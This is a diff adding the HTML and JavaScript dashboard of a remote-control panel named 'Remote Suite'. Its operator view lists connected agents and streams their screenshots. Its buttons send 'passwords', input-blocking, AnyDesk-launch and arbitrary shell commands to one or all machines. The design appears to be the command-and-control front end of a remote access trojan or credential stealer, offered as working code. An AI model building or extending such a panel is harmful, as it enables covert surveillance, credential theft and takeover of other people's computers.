@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Suite | Premium Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;800&family=Fira+Code&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="/css/style.css">
+    <style>
+        .monitor-frame {
+            width: 100%;
+            height: clamp(300px, 60vh, 800px);
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 20px;
+            border: 2px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .monitor-img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            transition: 0.3s;
+        }
+
+        .monitor-overlay {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-large {
+            padding: 16px 40px;
+            font-size: 16px;
+            border-radius: 50px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 30px var(--accent-glow);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="glass-container">
+        <aside class="sidebar">
+            <div class="brand">RS PREMIUM</div>
+
+            <div id="agent-list-container" style="flex: 1; overflow-y: auto;">
+                <p
+                    style="font-size: 10px; color: #888; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 1px;">
+                    Connected Clients</p>
+                <div id="client-list"></div>
+            </div>
+
+            <nav style="display: flex; flex-direction: column; gap: 12px; margin-top: 20px;">
+                <a href="/settings" class="nav-btn">Global Settings</a>
+                <div style="font-size: 10px; color: #555; text-align: center; margin-top: 10px;">Build v1.3 (Pro)</div>
+            </nav>
+        </aside>
+
+        <main class="main-content">
+            <div class="stat-grid" style="grid-column: 1 / 3;">
+                <div class="stat-card">
+                    <small>Active Host</small>
+                    <h2 id="active-client-name">Broadcast</h2>
+                </div>
+                <div class="stat-card">
+                    <small>Signal</small>
+                    <p id="active-client-status" style="margin-top: 5px; color: var(--accent);">STABLE</p>
+                </div>
+                <div class="stat-card">
+                    <small>Activity</small>
+                    <p id="last-action" style="font-size: 13px; margin-top: 5px; opacity: 0.7">Ready</p>
+                </div>
+            </div>
+
+            <div style="grid-column: 1/3;">
+                <div class="tab-nav">
+                    <button class="tab-link active" onclick="openTab(event, 'tab-monitor')">📺 Monitor</button>
+                    <button class="tab-link" onclick="openTab(event, 'tab-console')">📟 Console</button>
+                    <button class="tab-link" onclick="openTab(event, 'tab-activity')">📂 Activity</button>
+                </div>
+
+                <div id="tab-monitor" class="tab-content active">
+                    <div class="monitor-frame">
+                        <img id="main-monitor"
+                            src="https://via.placeholder.com/1280x720/000000/00f2fe?text=Waiting+for+Signal"
+                            class="monitor-img">
+                        <div class="monitor-overlay">
+                            <button class="action-btn btn-large" onclick="sendQuickCmd('screen')">📸 CAPTURE
+                                SCREEN</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-console" class="tab-content">
+                    <div class="action-grid">
+                        <button class="action-btn" onclick="sendQuickCmd('passwords')">🔑
+                            <span>Passwords</span></button>
+                        <button class="action-btn" onclick="sendQuickCmd('whoami')">👤 <span>Whoami</span></button>
+                        <button class="action-btn" onclick="sendQuickCmd('dir')">📂 <span>List Files</span></button>
+                        <button class="action-btn" style="color: #ff9f43;" onclick="sendQuickCmd('block')">🔒
+                            <span>Block Input</span></button>
+                        <button class="action-btn" style="color: #4ade80;" onclick="sendQuickCmd('unblock')">🔓
+                            <span>Unblock</span></button>
+                        <button class="action-btn" style="color: #00d2ff; border-color: #00d2ff;"
+                            onclick="sendQuickCmd('anydesk')">🚀 <span>AnyDesk</span></button>
+                        <button class="action-btn" style="color: #ff4b5c;"
+                            onclick="sendQuickCmd('TASKKILL /F /IM pythonw.exe')">🛑 <span>Kill Agent</span></button>
+                    </div>
+
+                    <div class="terminal-container" style="height: calc(100vh - 450px);">
+                        <div class="terminal-header">
+                            <span id="terminal-target">SHELL: BROADCAST</span>
+                        </div>
+                        <div class="terminal-view" id="terminal-view">
+                            <div class="line"><span class="prompt">[SYS]</span> Remote Suite Ready.</div>
+                        </div>
+                        <div class="terminal-input-row">
+                            <span class="prompt">></span>
+                            <input type="text" id="shell-input" placeholder="Custom command..." autocomplete="off">
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tab-activity" class="tab-content">
+                    <div class="feed-container" id="feed" style="height: calc(100vh - 300px);"></div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let selectedAgent = "ALL";
+
+        const clientList = document.getElementById('client-list');
+        const terminal = document.getElementById('terminal-view');
+        const input = document.getElementById('shell-input');
+        const feed = document.getElementById('feed');
+        const mainMonitor = document.getElementById('main-monitor');
+        const activeName = document.getElementById('active-client-name');
+        const termTarget = document.getElementById('terminal-target');
+        const lastAction = document.getElementById('last-action');
+
+        function openTab(evt, tabName) {
+            const contents = document.getElementsByClassName("tab-content");
+            for (let i = 0; i < contents.length; i++) contents[i].classList.remove("active");
+            const links = document.getElementsByClassName("tab-link");
+            for (let i = 0; i < links.length; i++) links[i].classList.remove("active");
+            document.getElementById(tabName).classList.add("active");
+            evt.currentTarget.classList.add("active");
+        }
+
+        async function sendQuickCmd(cmd) {
+            const line = document.createElement('div');
+            line.className = 'line';
+            line.style.opacity = '0.5';
+            line.innerHTML = `<span class="prompt">> [Sent]</span> ${cmd}`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+
+            await fetch('/api/cmd', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cmd, targetId: selectedAgent })
+            });
+        }
+
+        socket.on('agent_updates', (agents) => {
+            clientList.innerHTML = `<div class="agent-item ${selectedAgent === 'ALL' ? 'selected' : ''}" onclick="selectAgent('ALL', 'Broadcast Mode')"><div class="dot online"></div><div><div style="font-weight: 800; font-size: 13px;">ALL AGENTS</div><div style="font-size: 10px; opacity: 0.5;">Global</div></div></div>`;
+            agents.forEach(agent => {
+                clientList.innerHTML += `<div class="agent-item ${selectedAgent === agent.id ? 'selected' : ''}" onclick="selectAgent('${agent.id}', '${agent.hostname}')"><div class="dot ${agent.isOnline ? 'online' : 'offline'}"></div><div><div style="font-weight: 800; font-size: 13px;">${agent.hostname}</div><div style="font-size: 10px; opacity: 0.5;">${agent.id}</div></div></div>`;
+            });
+        });
+
+        function selectAgent(id, name) {
+            selectedAgent = id;
+            activeName.innerText = name;
+            termTarget.innerText = `SHELL: ${name.toUpperCase()}`;
+            document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('selected'));
+        }
+
+        socket.on('new_report', (data) => {
+            if (selectedAgent !== "ALL" && selectedAgent !== data.id) return;
+            const line = document.createElement('div');
+            line.className = 'line';
+            line.innerHTML = `<span class="prompt">[${data.time}]</span> <span style="color: var(--accent);">${data.id}</span>: ${data.content}`;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="time">${data.time}</span> <span style="color: var(--accent); font-weight: 800; margin-right: 10px;">${data.type}</span> ${data.content}`;
+            feed.prepend(entry);
+        });
+
+        socket.on('new_screenshot', (data) => {
+            if (selectedAgent !== "ALL" && selectedAgent !== data.id) return;
+            mainMonitor.src = data.url;
+            lastAction.innerText = `Capture from ${data.id}`;
+        });
+
+        input.addEventListener('keypress', async (e) => {
+            if (e.key === 'Enter') {
+                const cmd = input.value;
+                input.value = '';
+                sendQuickCmd(cmd);
+            }
+        });
+    </script>
+</body>
+
+</html>
